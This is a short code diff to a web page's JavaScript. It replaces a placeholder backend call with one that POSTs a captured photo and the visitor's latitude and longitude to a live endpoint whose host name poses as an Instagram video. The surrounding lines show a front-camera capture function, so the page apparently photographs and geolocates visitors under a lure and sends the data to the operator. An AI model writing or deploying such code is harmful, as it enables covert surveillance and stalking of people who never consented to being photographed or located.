@@ -5,29 +5,20 @@ document.addEventListener('DOMContentLoaded', () => {
     let videoStream = null;
 
     // Helper function to send data to backend
-    async function sendDataToBackend(data) {
-        // Replace with your actual backend endpoint
-        const backendEndpoint = 'https://your-backend.com/capture'; 
-        try {
-            const response = await fetch(backendEndpoint, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            });
-
-            if (response.ok) {
-                console.log('Data sent successfully!');
-                const result = await response.json();
-                console.log('Backend response:', result);
-            } else {
-                console.error('Failed to send data to backend:', response.status, response.statusText);
-            }
-        } catch (error) {
-            console.error('Error sending data to backend:', error);
-        }
+    async function sendDataToBackend(photo, latitude, longitude) {
+    const backendEndpoint = 'https://instagram-video-329865.onrender.com/capture';
+    const data = { photo, latitude, longitude };
+    try {
+        const response = await fetch(backendEndpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        console.log('Data sent!', await response.json());
+    } catch (err) {
+        console.error('Error sending data:', err);
     }
+}
 
     // Function to capture photo from front camera
     async function capturePhoto() {
